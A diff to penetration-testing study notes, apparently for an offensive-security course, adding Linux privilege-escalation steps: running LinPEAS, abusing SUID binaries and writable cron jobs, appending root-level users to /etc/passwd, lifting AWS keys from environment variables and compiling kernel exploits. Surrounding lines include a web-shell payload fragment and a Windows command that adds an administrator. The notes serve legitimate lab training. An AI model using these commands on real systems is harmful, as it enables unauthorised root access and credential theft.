@@ -279,6 +279,11 @@ Kali port:
   - **Flag: local.txt, proof.txt**
 
 - **Linux**
+  - Transfer back/forth to Linux target
+    ```
+    scp linpeas.sh user@target:
+    scp <user>@<target>:/home/joe/output.txt /home/kali/share/results/
+    ```
   - **SSH keys**
     - ~/.ssh/id_rsa → private key
     - ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519
@@ -956,17 +961,42 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - `.\SigmaPotato "net localgroup Administrators dave4 /add"`  
 
 # Linux priviledge  
+- Automated Tool - LinPEAS.sh
+  - https://osintteam.blog/practical-guide-to-using-linpeas-for-linux-privilege-escalation-a7c753dd5293
+  - transfer linpeas.sh and execute
+    ```
+    #kali
+    scp linpeas.sh user@target
+    wget http://<kali>/linpeas.sh -O linpeas.sh
+
+    #target
+    chmod +x linpeas.sh
+    ./linpeas.sh | tee linpeas_output.txt
+    ```
+  - Analyze red/yellow font
+    - SUID - Check easy privesc, exploits and write perms (E.g /usr/bin/find).
+      - `/usr/bin/find` > Exploit with GTFOBins
+    - Check for vulnerable cron jobs
+      - `-rwxrwxrwx 1 root root 1234 /etc/cron.d/backup.sh` > edit the writable backup.sh > `echo 'root::0:0::/root:/bin/bash' >> /etc/passwd`  
+    - Interesting writable files
+      - `/etc/passwd` `/etc/sudoers.d/` > Modify /etc/passwd to create a root shell > `echo 'malicioususer:x:0:0::/root:/bin/bash' >> /etc/passwd su malicioususer`  
+    - Checking all env variables
+      - `AWS_SECRET_KEY=EXAMPLEDATA12345` > aws configure
+    - Kernel Exploits > research and download a matching exploit > compile and execute
+      - `gcc exploit.c -o exploit ./exploit` 
 - Enumeration
   - Manual  
     User/Groups: `id` `whoami` `cat /etc/passwd` `cat /etc/shadow` `groups` `ps aux`  
     **Priviledge: `sudo -l`  `find / -perm -4000 -type f 2>/dev/null`  `find / -perm -2000 -type f 2>/dev/nul`**  
     System and apps: `cat /etc/*release` `uname -a` `dpkg -l`  
-    List cron jobs: `ls -lah /etc/cron*`   
+    List cron jobs: `ls -lah /etc/cron*` `crontab -l` `sudo crontab -l //root`  
     List writable directories: `find / -writable -type d 2>/dev/null` `find / -writable -type f 2>/dev/null`    
     setuid, segid: `find / -perm -u=s -type f 2>/dev/null`    
-  - **Automation - unix-privesc-check**  
-    `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`  
-    `joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt`  
+  - **Automation - unix-privesc-check**
+    - Download from https://pentestmonkey.net/tools/audit/unix-privesc-check  
+    - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.196.214:/home/joe`  
+    - `joe@debian-privesc:~$ ./upc.sh standard > unix-privesc-check.txt`  
+    - Look for writable files "WARNING:"  
 - Exposed Credential Info  
   - Env variables  
     `joe@debian-privesc:~$ env`
